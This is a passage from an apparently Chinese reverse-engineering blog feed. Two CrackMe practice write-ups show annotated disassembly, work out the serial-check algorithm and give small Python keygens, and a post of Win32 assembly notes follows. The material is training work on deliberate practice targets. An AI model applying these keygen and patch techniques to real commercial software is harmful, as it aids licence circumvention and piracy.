Afkayas_.00401B80                   ;  You Get It</div><div class="line">00402592   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \r\n</div><div class="line">00402597   .  FFD7          call edi</div><div class="line">00402599   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">0040259B   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">0040259E   .  FFD3          call ebx</div><div class="line">004025A0   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025A1   .  68 A81B4000   push Afkayas_.00401BA8                   ;  KeyGen It Now</div><div class="line">004025A6   .  FFD7          call edi</div><div class="line">004025A8   .  8D4D 94       lea ecx,dword ptr ss:[ebp-0x6C]</div><div class="line">004025AB   .  8945 CC       mov dword ptr ss:[ebp-0x34],eax          ;  Afkayas_.00402191</div><div class="line">004025AE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]</div><div class="line">004025B1   .  51            push ecx</div><div class="line">004025B2   .  8D45 B4       lea eax,dword ptr ss:[ebp-0x4C]</div><div class="line">004025B5   .  52            push edx</div><div class="line">004025B6   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025B7   .  8D4D C4       lea ecx,dword ptr ss:[ebp-0x3C]</div><div class="line">004025BA   .  6A 00         push 0x0</div><div class="line">004025BC   .  51            push ecx</div><div class="line">004025BD   .  C745 C4 08000&gt;mov dword ptr ss:[ebp-0x3C],0x8</div><div class="line">004025C4   .  FF15 10414000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcMsgBox&gt;;  msvbvm50.rtcMsgBox</div><div class="line">004025CA   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">004025CD   .  FF15 80414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeS&gt;;  msvbvm50.__vbaFreeStr</div><div class="line">004025D3   .  8D55 94       lea edx,dword ptr ss:[ebp-0x6C]</div><div class="line">004025D6   .  8D45 A4       lea eax,dword ptr ss:[ebp-0x5C]</div><div class="line">004025D9   .  52            push edx</div><div class="line">004025DA   .  8D4D B4       lea ecx,dword ptr ss:[ebp-0x4C]</div><div class="line">004025DD   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025DE   .  8D55 C4       lea edx,dword ptr ss:[ebp-0x3C]</div><div class="line">004025E1   .  51            push ecx</div><div class="line">004025E2   .  52            push edx</div><div class="line">004025E3   .  EB 56         jmp short Afkayas_.0040263B</div><div class="line">004025E5   &gt;  68 C81B4000   push Afkayas_.00401BC8                   ;  You Get Wrong</div><div class="line">004025EA   .  68 9C1B4000   push Afkayas_.00401B9C                   ;  \r\n</div><div class="line">004025EF   .  FFD7          call edi</div><div class="line">004025F1   .  8BD0          mov edx,eax                              ;  Afkayas_.00402191</div><div class="line">004025F3   .  8D4D E8       lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">004025F6   .  FFD3          call ebx</div><div class="line">004025F8   .  50            push eax                                 ;  Afkayas_.00402191</div><div class="line">004025F9   .  68 E81B4000   push Afkayas_.00401BE8                   ;  Try Again</div></pre></td></tr></table></figure>
<p>通过分析可以看到加密关键代码是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]          ;  用户名 -&gt; eax</div><div class="line">00402412   .  50            push eax                                 ; /用户名 -&gt; 堆栈</div><div class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]               ; |</div><div class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBs&gt;; \len(用户名) -&gt; eax</div><div class="line">0040241B   .  8BF8          mov edi,eax                              ;  len(用户名) -&gt; edi</div><div class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]          ;  用户名 -&gt; ecx</div><div class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                     ;  len(用户名) * 0x17CFB ==&gt; edi=A6ADD</div><div class="line">00402426   .  51            push ecx                                 ; /String = NULL</div><div class="line">00402427   .  0F80 91020000 jo Afkayas_.004026BE                     ; |</div><div class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#rtcAnsiVa&gt;; \用户名去掉首字母 -&gt; edx</div><div class="line">0040243E   .  57            push edi                                 ;  len(用户名) * 0x17CFB 入栈-&gt; ebp-D4</div><div class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;;  十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值  -&gt; eax</div><div class="line">0040251D   .  68 701B4000   push Afkayas_.00401B70                   ;  &quot;AKA-&quot;入栈</div><div class="line">00402522   .  51            push ecx                                 ; /十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值 入栈</div><div class="line">00402523   .  FFD7          call edi                                 ; \&quot;AKA-&quot;+&quot;十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值&quot;   -&gt;  eax</div></pre></td></tr></table></figure></p>
<p>可以看出流程就是 “AKA-“+”十进制(len(用户名) * 0x17CFB) + 首字母十进制ascii值”  </p>
<p>写注册机（Python）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">username = sys.argv[<span class="number">1</span>]</div><div class="line">pwend = len(username) * <span class="number">0x17CFB</span> + ord(username[<span class="number">0</span>])</div><div class="line">password = <span class="string">"AKA-%d"</span>%pwend</div><div class="line">print(password)</div></pre></td></tr></table></figure></p>
<p>测试结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\Administrator\Desktop&gt;python 1.py akkuman</div><div class="line">AKA-682814</div></pre></td></tr></table></figure></p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjle318xy9j20ir0abgu6.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先查壳无壳，输入伪码报错，根据报错od查找字符串，定位到错误代码附近，可以看到有个条件跳转，改掉就可以爆破，接下来分析下注册算法，我们周围看看，从最近几个call看，并没有我们输入的用户名在堆栈中出现，那我们直接从这个函数开头往下找，一般一个函数开头是push ebp一段代码用来提升堆栈，找到后我们往下找，注意堆栈，直到我们输入的字符出现，开始细心往下跟&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe练手 001</title>
    <link href="http://hacktech.cn/2017/09/15/160CrackMe-001.html"/>
    <id>http://hacktech.cn/2017/09/15/160CrackMe-001.html</id>
    <published>2017-09-15T08:16:12.000Z</published>
    <updated>2017-09-16T06:45:46.687Z</updated>
    
    <content type="html"><![CDATA[<p>peid判断无壳，打开输入伪码注册，根据报错od查找字符串<br>接下来定位到字符串周边代码<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">0042FA15  |.  8D55 F0       lea edx,[local.4]</div><div class="line">0042FA18  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</div><div class="line">0042FA1E  |.  E8 35B0FEFF   call Acid_bur.0041AA58</div><div class="line">0042FA23  |.  8B45 F0       mov eax,[local.4]</div><div class="line">0042FA26  |.  0FB640 03     movzx eax,byte ptr ds:[eax+0x3]</div><div class="line">0042FA2A  |.  6BF0 0B       imul esi,eax,0xB</div><div class="line">0042FA2D  |.  8D55 EC       lea edx,[local.5]</div><div class="line">0042FA30  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</div><div class="line">0042FA36  |.  E8 1DB0FEFF   call Acid_bur.0041AA58</div><div class="line">0042FA3B  |.  8B45 EC       mov eax,[local.5]                        ;  堆栈中可看到[local.5和4]都是你输入的用户名</div><div class="line">0042FA3E  |.  0FB640 02     movzx eax,byte ptr ds:[eax+0x2]</div><div class="line">0042FA42  |.  6BC0 0E       imul eax,eax,0xE</div><div class="line">0042FA45  |.  03F0          add esi,eax</div><div class="line">0042FA47  |.  8935 58174300 mov dword ptr ds:[0x431758],esi</div><div class="line">0042FA4D  |.  A1 6C174300   mov eax,dword ptr ds:[0x43176C]</div><div class="line">0042FA52  |.  E8 D96EFDFF   call Acid_bur.00406930</div><div class="line">0042FA57  |.  83F8 04       cmp eax,0x4                              ;  如果用户名长度大于等于4跳转</div><div class="line">0042FA5A  |.  7D 1D         jge short Acid_bur.0042FA79</div><div class="line">0042FA5C  |.  6A 00         push 0x0</div><div class="line">0042FA5E  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!</div><div class="line">0042FA63  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !</div><div class="line">0042FA68  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</div><div class="line">0042FA6D  |.  8B00          mov eax,dword ptr ds:[eax]</div><div class="line">0042FA6F  |.  E8 FCA6FFFF   call Acid_bur.0042A170</div><div class="line">0042FA74  |.  E9 BE000000   jmp Acid_bur.0042FB37</div><div class="line">0042FA79  |&gt;  8D55 F0       lea edx,[local.4]</div><div class="line">0042FA7C  |.  8B83 DC010000 mov eax,dword ptr ds:[ebx+0x1DC]</div><div class="line">0042FA82  |.  E8 D1AFFEFF   call Acid_bur.0041AA58</div><div class="line">0042FA87  |.  8B45 F0       mov eax,[local.4]                        ;  取你输入的用户名</div><div class="line">0042FA8A  |.  0FB600        movzx eax,byte ptr ds:[eax]              ;  取用户名的第一个字母放入eax</div><div class="line">0042FA8D  |.  F72D 50174300 imul dword ptr ds:[0x431750]             ;  eax = eax * 29h</div><div class="line">0042FA93  |.  A3 50174300   mov dword ptr ds:[0x431750],eax</div><div class="line">0042FA98  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]</div><div class="line">0042FA9D  |.  0105 50174300 add dword ptr ds:[0x431750],eax          ;  [0x431750] = eax * 2</div><div class="line">0042FAA3  |.  8D45 FC       lea eax,[local.1]</div><div class="line">0042FAA6  |.  BA ACFB4200   mov edx,Acid_bur.0042FBAC                ;  CW</div><div class="line">0042FAAB  |.  E8 583CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现&quot;CW&quot;放入了[local.1]</div><div class="line">0042FAB0  |.  8D45 F8       lea eax,[local.2]</div><div class="line">0042FAB3  |.  BA B8FB4200   mov edx,Acid_bur.0042FBB8                ;  CRACKED</div><div class="line">0042FAB8  |.  E8 4B3CFDFF   call Acid_bur.00403708                   ;  观察堆栈可发现&quot;CRACKED&quot;放入了[local.2]</div><div class="line">0042FABD  |.  FF75 FC       push [local.1]                           ;  Acid_bur.0042FBAC</div><div class="line">0042FAC0  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -  ;两个push把&quot;CW&quot;和&quot;-&quot;入栈</div><div class="line">0042FAC5  |.  8D55 E8       lea edx,[local.6]</div><div class="line">0042FAC8  |.  A1 50174300   mov eax,dword ptr ds:[0x431750]</div><div class="line">0042FACD  |.  E8 466CFDFF   call Acid_bur.00406718                   ;  用户名第一个字母*29*2的值放入[local.6]</div><div class="line">0042FAD2  |.  FF75 E8       push [local.6]</div><div class="line">0042FAD5  |.  68 C8FB4200   push Acid_bur.0042FBC8                   ;  -</div><div class="line">0042FADA  |.  FF75 F8       push [local.2]                           ;  &quot;用户名第一个字母*29*2&quot;,&quot;-&quot;,&quot;CRACKED&quot;入栈</div><div class="line">0042FADD  |.  8D45 F4       lea eax,[local.3]</div><div class="line">0042FAE0  |.  BA 05000000   mov edx,0x5</div><div class="line">0042FAE5  |.  E8 C23EFDFF   call Acid_bur.004039AC                   ;  CW-算好的数据-CRACKED  放入[local.3]</div><div class="line">0042FAEA  |.  8D55 F0       lea edx,[local.4]</div><div class="line">0042FAED  |.  8B83 E0010000 mov eax,dword ptr ds:[ebx+0x1E0]</div><div class="line">0042FAF3  |.  E8 60AFFEFF   call Acid_bur.0041AA58</div><div class="line">0042FAF8  |.  8B55 F0       mov edx,[local.4]                        ;  取出你输入的密码=&gt;edx</div><div class="line">0042FAFB  |.  8B45 F4       mov eax,[local.3]                        ;  正确密码=&gt;eax</div><div class="line">0042FAFE  |.  E8 F93EFDFF   call Acid_bur.004039FC</div><div class="line">0042FB03  |.  75 1A         jnz short Acid_bur.0042FB1F              ;  判断密码是否正确</div><div class="line">0042FB05  |.  6A 00         push 0x0</div><div class="line">0042FB07  |.  B9 CCFB4200   mov ecx,Acid_bur.0042FBCC                ;  Congratz !!</div><div class="line">0042FB0C  |.  BA D8FB4200   mov edx,Acid_bur.0042FBD8                ;  Good job dude =)</div><div class="line">0042FB11  |.  A1 480A4300   mov eax,dword ptr ds:[0x430A48]</div><div class="line">0042FB16  |.  8B00          mov eax,dword ptr ds:[eax]</div><div class="line">0042FB18  |.  E8 53A6FFFF   call Acid_bur.0042A170</div><div class="line">0042FB1D  |.  EB 18         jmp short Acid_bur.0042FB37</div><div class="line">0042FB1F  |&gt;  6A 00         push 0x0</div><div class="line">0042FB21  |.  B9 74FB4200   mov ecx,Acid_bur.0042FB74                ;  Try Again!</div><div class="line">0042FB26  |.  BA 80FB4200   mov edx,Acid_bur.0042FB80                ;  Sorry , The serial is incorect !</div></pre></td></tr></table></figure>
<p>注册算法就是password = “CW-“ + 取用户名第一位asciix29x2 + “-CRACKED”  </p>
<p>注册机（python）：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">username = sys.argv[<span class="number">1</span>]</div><div class="line">password = ord(username[<span class="number">0</span>])*<span class="number">0x29</span>*<span class="number">0x2</span></div><div class="line">print(<span class="string">"password:"</span>+<span class="string">"CW-"</span>+<span class="string">"%d"</span>%(password)+<span class="string">"-CRACKED"</span>)</div></pre></td></tr></table></figure></p>
<p>测试：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\Administrator\Desktop&gt;python 1.py akkuman</div><div class="line">password:CW-7954-CRACKED</div></pre></td></tr></table></figure></p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjkbn9nb37j20di068407.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;peid判断无壳，打开输入伪码注册，根据报错od查找字符串&lt;br&gt;接下来定位到字符串周边代码&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Windows环境下32位汇编语言程序设计笔记-基础篇</title>
    <link href="http://hacktech.cn/2017/09/14/Windows%E7%8E%AF%E5%A2%83%E4%B8%8B32%E4%BD%8D%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E7%AF%87.html"/>
    <id>http://hacktech.cn/2017/09/14/Windows环境下32位汇编语言程序设计笔记-基础篇.html</id>
    <published>2017-09-14T14:09:28.000Z</published>
    <updated>2017-09-14T14:53:38.412Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内存模式"><a href="#内存模式" class="headerlink" title="内存模式"></a>内存模式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat,stdcall ;子程序调用模式，win32中只能用stdcall，因为win32api调用使用的这个</div><div class="line">option casemap:none ;定义了程序中变量和子程序名是否对大小写敏感，win32api名称区分大小写，所以只需要记住这个定式</div></pre></td></tr></table></figure>
<a id="more"></a>
<ol>
<li>指定使用的指令集</li>
<li>.model语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.model 内存模式[,语言模式][,其他模式]</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>内存模式</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>内存使用方式</th>
</tr>
</thead>
<tbody>
<tr>
<td>tiny</td>
<td>用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内</td>
</tr>
<tr>
<td>small</td>
<td>建立代码和数据分别用一个64KB段的.exe文件</td>
</tr>
<tr>
<td>medium</td>
<td>代码段可以有多个64KB段，数据段只有一个64KB段</td>
</tr>
<tr>
<td>compact</td>
<td>代码段只有一个64KB段，数据段可以有多个64KB段</td>
</tr>
<tr>
<td>large</td>
<td>代码段和数据段都可以有多个64KB段</td>
</tr>
<tr>
<td>huge</td>
<td>同large，并且数据段中的一个数组也可以超过64KB</td>
</tr>
<tr>
<td>flat</td>
<td>Win32程序使用的模式，代码和数据使用同一个4GB段</td>
</tr>
</tbody>
</table>
<p><strong><em>对于Win32程序来说，只有一种内存模式，flat模式</em></strong></p>
<h2 id="源程序结构"><a href="#源程序结构" class="headerlink" title="源程序结构"></a>源程序结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">.386</div><div class="line">.model flat,stdcall</div><div class="line">option casemap:none</div><div class="line">  &lt;一些include语句&gt;</div><div class="line">.stack [堆栈段的大小] ;常忽略不写</div><div class="line">.data</div><div class="line">  &lt;一些初始化过的变量定义&gt;</div><div class="line">.data?</div><div class="line">  &lt;一些没有初始化过的变量定义&gt;</div><div class="line">.const</div><div class="line">  &lt;一些常量定义&gt;</div><div class="line">.code</div><div class="line">  &lt;代码&gt;</div><div class="line">  &lt;开始标号&gt;</div><div class="line">      &lt;其他语句&gt;</div><div class="line">  end &lt;开始标号&gt;</div></pre></td></tr></table></figure>
<h2 id="局部变量的定义"><a href="#局部变量的定义" class="headerlink" title="局部变量的定义"></a>局部变量的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">local    变量名1[[重复数量]][:类型],变量名2[[重复数量]][:类型]......</div></pre></td></tr></table></figure>
<p><em>local伪指令必须紧接在子程序的伪指令proc后</em></p>
<p><strong>变量的类型</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">表示方式</th>
<th style="text-align:left">缩写</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">字节</td>
<td style="text-align:left">Byte</td>
<td style="text-align:left">db</td>
</tr>
<tr>
<td style="text-align:left">字</td>
<td style="text-align:left">word</td>
<td style="text-align:left">dw</td>
</tr>
<tr>
<td style="text-align:left">双字(doubleword)</td>
<td style="text-align:left">dword</td>
<td style="text-align:left">dd</td>
</tr>
<tr>
<td style="text-align:left">三字(farword)</td>
<td style="text-align:left">fword</td>
<td style="text-align:left">df</td>
</tr>
<tr>
<td style="text-align:left">四字(quadword)</td>
<td style="text-align:left">qword</td>
<td style="text-align:left">dq</td>
</tr>
<tr>
<td style="text-align:left">十字节BCD码(tenbyte)</td>
<td style="text-align:left">tbyte</td>
<td style="text-align:left">dt</td>
</tr>
<tr>
<td style="text-align:left">有符号字节(signbyte)</td>
<td style="text-align:left">sbyte</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">有符号字(signword)</td>
<td style="text-align:left">sword</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">有符号双字(signdword)</td>
<td style="text-align:left">sdword</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">单精度浮点数</td>
<td style="text-align:left">Real4</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">双精度浮点数</td>
<td style="text-align:left">Real8</td>
<td style="text-align:left"></td>
</tr>
<tr>
<td style="text-align:left">10字节浮点数</td>
<td style="text-align:left">Real10</td>
</tr>
</tbody>
</table>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">结构名    struct</div><div class="line"></div><div class="line">字段1     类型    ?</div><div class="line">字段2     类型    ?</div><div class="line">......</div><div class="line"></div><div class="line">结构名    ends</div></pre></td></tr></table></figure>
<p><strong>定义</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">        .data?</div><div class="line">变量名称    结构名    &lt;字段1,字段2,...&gt;</div><div class="line">;或者</div><div class="line">        .data?</div><div class="line">变量名称    结构名    &lt;&gt;</div></pre></td></tr></table></figure></p>
<p><strong>使用</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">;前提假设结构名为WNDCLASS,结构体变量名为stWndClass,里面有字段lpfnWndProc</div><div class="line"></div><div class="line">;1</div><div class="line">mov    eax,stWndClass.lpfnWndProc</div><div class="line"></div><div class="line">;2.esi寄存器作指针寻址</div><div class="line">mov    esi,offset stWndClass</div><div class="line">mov    eax,[esi + WNDCLASS.lpfnWndProc]    ;注意这里是WNDCLASS</div><div class="line"></div><div class="line">;3.用assume伪指令把寄存器预先定义为结构指针</div><div class="line">mov    esi,offset stWndClass</div><div class="line">assume esi:ptr WNDCLASS</div><div class="line">mov    eax,[esi].lpfnWndProc</div><div class="line">...</div><div class="line">assume esi:nothing    ;注意：不使用esi做指针的时候需要用这句取消定义</div><div class="line"></div><div class="line">;4.结构的定义可以嵌套</div><div class="line">NEW_WNDCLASS    struct</div><div class="line"></div><div class="line">dwOption        word        ?</div><div class="line">oldWndClass     WNDCLASS    &lt;&gt;</div><div class="line"></div><div class="line">NEW_WNDCLASS    ends</div><div class="line"></div><div class="line">;5.嵌套的引用</div><div class="line">mov    wax,[esi].oldWndClass.lpfnWndProc</div></pre></td></tr></table></figure></p>
<h2 id="以不同的类型访问变量"><a href="#以不同的类型访问变量" class="headerlink" title="以不同的类型访问变量"></a>以不同的类型访问变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">;以db定义一个缓冲区</div><div class="line">szBuffer    db    1024 dup (?)</div><div class="line">;mov    ax,szBuffer ;错误，masm中，如果要用制定类型之外的长度访问变量，必须显式指出要访问的长度，这样编译器忽略语法上的长度检验，仅使用变量的地址</div><div class="line">;类型 ptr 变量名</div><div class="line">mov    ax,word ptr szBuffer</div><div class="line">mov    eax,dword ptr szBuffer</div></pre></td></tr></table></figure>
<h2 id="movzx"><a href="#movzx" class="headerlink" title="movzx"></a>movzx</h2><p>把一个字节扩展到一个字或一个字或一个双字再放到ax或eax中，高位保持0而不是越界存取到其他的变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">    .data</div><div class="line">bTest1    db    12h</div><div class="line">    .code</div><div class="line">movzx    ax,bTest1</div><div class="line">movzx    eax,bTest1</div></pre></td></tr></table></figure></p>
<h2 id="变量的尺寸和数量"><a href="#变量的尺寸和数量" class="headerlink" title="变量的尺寸和数量"></a>变量的尺寸和数量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sizeof    变量名、数据类型或数据结构名 ;取得变量、数据类型或数据结构以字节为单位的长度</div><div class="line">lengthof  变量名、数据类型或数据结构名 ;取得变量中数据的项数</div></pre></td></tr></table></figure>
<h2 id="获取变量地址"><a href="#获取变量地址" class="headerlink" title="获取变量地址"></a>获取变量地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov    寄存器,offset 变量名    ;offset是取变量地址的伪操作符</div><div class="line">lea    eax,[ebp-4]            ;运行时按照ebp的值实际计算出地址放到eax中</div><div class="line">;invoke伪指令参数要用到一个局部变量的地址时，参数中不可能写入lea指令，用offset又是不对的，可用addr</div><div class="line">addr   局部变量名和全局变量名   ;全局变量名时编译器按照odffset的用法来用；局部变量名时，编译器用lea先把地址取到wax中，然后用eax代替变量地址使用</div><div class="line">;invoke中使用addr时，它的左边不能使用wax，否则eax的值会被覆盖</div></pre></td></tr></table></figure>
<h2 id="子程序的定义"><a href="#子程序的定义" class="headerlink" title="子程序的定义"></a>子程序的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">子程序名 proc [距离][语言类型][可视区域][USES寄存器列表][,参数:类型]...[VARARG]</div><div class="line">        local 局部变量列表</div><div class="line"></div><div class="line">        指令</div><div class="line"></div><div class="line">子程序名 endp</div></pre></td></tr></table></figure>
<h2 id="参数传递和堆栈平衡"><a href="#参数传递和堆栈平衡" class="headerlink" title="参数传递和堆栈平衡"></a>参数传递和堆栈平衡</h2><p><strong>不同语言调用方式的差别</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left">C</th>
<th style="text-align:left">SysCall</th>
<th style="text-align:left">StdCall</th>
<th style="text-align:left">BASIC</th>
<th style="text-align:left">FORTRAN</th>
<th style="text-align:left">PASCAL</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">最先入栈参数</td>
<td style="text-align:left">右</td>
<td style="text-align:left">右</td>
<td style="text-align:left">右</td>
<td style="text-align:left">左</td>
<td style="text-align:left">左</td>
<td style="text-align:left">左</td>
</tr>
<tr>
<td style="text-align:left">清除堆栈者</td>
<td style="text-align:left">调用者</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
<td style="text-align:left">子程序</td>
</tr>
<tr>
<td style="text-align:left">允许使用VARARG</td>
<td style="text-align:left">是</td>
<td style="text-align:left">是</td>
<td style="text-align:left">是</td>
<td style="text-align:left">否</td>
<td style="text-align:left">否</td>
<td style="text-align:left">否</td>
</tr>
</tbody>
</table>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjjg3l2dztj209w08f0ur.jpg" alt=""></p>
